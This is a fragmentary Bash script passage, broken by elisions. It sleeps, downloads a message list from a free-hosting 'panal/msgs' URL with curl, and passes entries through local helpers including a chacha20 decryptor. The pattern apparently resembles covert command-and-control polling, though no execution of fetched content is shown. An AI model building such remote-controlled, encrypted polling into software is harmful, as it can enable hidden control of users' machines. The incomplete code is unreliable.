...
cd $PaPWD
#echo "$nomprograma.."
remotepath="https://curare2019.000webhostapp.com/panal/msgs"
sleep 13
encuentra="ALGO"
echo ""  | tr -d '
' > $nomprograma.lis
curl -L "$remotepath" > $nomprograma.list
while [ -n "$encuentra" ];do
    ...
    cp -v "$nomprograma.list.tmp" "$nomprograma.list"
...
'|$PrPWD/stdcdr " ")
    chacha=$(echo "$listf"|$PrPWD/chacha20|$PrPWD/stddelcar " ")
    encuentra=""
